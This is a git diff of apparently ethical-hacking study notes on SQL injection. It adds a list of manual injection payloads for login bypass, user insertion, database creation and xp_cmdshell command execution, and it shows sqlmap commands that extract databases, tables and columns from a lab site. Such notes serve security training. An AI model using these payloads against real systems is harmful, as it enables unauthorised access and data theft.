@@ -2,9 +2,28 @@
 
 ## Module 15 - SQL Injection
 
+## Manual Injection
+
+* `‘ or 1=1 --`  for login bypass
+* admin' --
+* admin' #
+* admin'/\*
+* ' or 1=1--
+* ' or 1=1#
+* ' or 1=1/\*
+* ') or '1'='1--
+* ') or ('1'='1—
+* `‘insert into login values ('john','apple123'); --` create own user in the database
+* `‘create database mydatabase; --`  create database with name of mydatabase
+* `‘exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --` execute ping on moviescope
+
+## SQLMap
+
+### Basic Commands
+
 * SQLMAP Extract DBS
   * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --dbs`
-  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --data="id=1&Submit=Submit"``--dbs`
+  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --data="id=1&Submit=Submit"--dbs`
 * Extract Tables
   * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope --tables`
 * Extract Columns
@@ -22,7 +41,7 @@
 * Execute cmd from login
   * `blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --`
 
-### **Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap**
+### **Perform an SQL Injection Attack Against MSSQL to Extract Databases using SQLMap**
 
 * Login a website
 * Inspect element
